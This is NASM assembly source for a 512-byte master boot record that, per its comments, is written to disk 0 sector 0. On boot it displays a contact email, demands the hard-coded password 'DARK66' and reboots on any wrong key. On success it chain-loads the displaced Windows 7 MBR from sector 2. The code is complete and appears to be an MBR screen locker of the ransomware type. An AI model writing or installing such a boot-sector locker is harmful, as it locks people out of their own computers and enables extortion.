; write code at Disk 0 sector 0 silandr 0
; 512 byte Size 
; Nasm assembller  nasm -f bin Pass.asm -o PASS.bin 
; Pass is DARK 66
; Remember  16 + BX  Physical address = ES × 16 + BX   OR  ES × 10h + BX   -> AX
bits 16
org 0x7C00

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7A00
    cld
;************************************
    mov [0x0500], dl      
    mov byte [0x0502], 0x07
    mov ax, 0x0003
    int 10h
    mov si, msg
    call print_string
;************************************
    mov bh, 0x00           
; check Pass 
; === D ===
    xor ax, ax
    int 16h
    cmp al, 'D'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change

; === A ===
    xor ax, ax
    int 16h
    cmp al, 'A'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change

; === R ===
    xor ax, ax
    int 16h
    cmp al, 'R'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change

; === K ===
    xor ax, ax
    int 16h
    cmp al, 'K'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change

; === 6 ===
    xor ax, ax
    int 16h
    cmp al, '6'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change

; === 6 ===
    xor ax, ax
    int 16h
    cmp al, '6'
    jne reboot
    mov ah, 0x0E
    mov bl, 0x07
    int 10h
    call change
;**************************************************
; load 0600  and load_sector2 at 0x7C00
password_ok:
    mov si, 0x7C00
    mov di, 0x0600
    mov cx, 256
    rep movsw

    push word 0x0000
    push word (load_sector2 - start) + 0x0600
    retf
	
;*************************************************
load_sector2:
    xor ax, ax
    mov ds, ax
    mov es, ax

    mov dl, [0x0500]
    mov ah, 0x02
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    mov bx, 0x7C00
    int 13h
    jc reboot
	
;windows Mbr 7
; ===  MBRWIN7 ===
    jmp 0x0000:0x7C00

reboot:
    int 19h
    cli
;HalT ....!
hang:
    hlt
    jmp hang
;******************************************
; the color of the screen changes every time you press the right key.
change:
    mov ax, 0x0600
    mov bh, [0x0502]
    add byte [0x0502], 0x10
    xor cx, cx
; CX 0000 First pixel 
   mov dx, 0x184F
; VGA   
   int 10h
    ret
;******************************************
print_string:
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
.loop:
    lodsb
    test al, al
    jz .done
    int 10h
    jmp .loop
.done:
    ret
; Email Or message Hello GoD
msg db 'Connect to: example@mail.com', 0x0D, 0x0A, 0x0A, 0

;*********** Signeture AA55 2 byte
times 510-($-$$) db 0
dw 0xAA55
